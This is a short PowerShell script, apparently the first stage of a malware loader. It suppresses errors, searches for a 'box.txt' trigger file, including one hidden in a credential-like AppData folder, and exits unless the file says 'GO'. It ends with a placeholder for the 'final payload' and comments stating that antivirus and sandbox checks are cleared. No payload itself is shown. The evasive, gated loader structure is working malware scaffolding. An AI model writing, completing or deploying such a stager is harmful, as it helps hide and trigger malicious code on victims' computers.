# stage1.ps1 - Read box.txt, check GO, execute final payload

$ErrorActionPreference = 'SilentlyContinue'
$appData = [System.IO.Path]::GetFolderPath('ApplicationData')
$desktop = [System.Environment]::GetFolderPath('Desktop')
$boxPath = "$appData\Microsoft\Credentials\box.txt"

# Find box.txt
$locations = @($boxPath, "$desktop\box.txt", "$env:TEMP\box.txt")
$found = $false

foreach ($loc in $locations) {
    if (Test-Path $loc) {
        $content = [System.IO.File]::ReadAllText($loc, [System.Text.Encoding]::UTF8)
        if ($content -match "GO") {
            $found = $true
            break
        }
    }
}

if (-not $found) { exit }

# === FINAL PAYLOAD GOES HERE ===
# All clear - AV checked, no sandbox, GO confirmed
# Insert final execution logic here
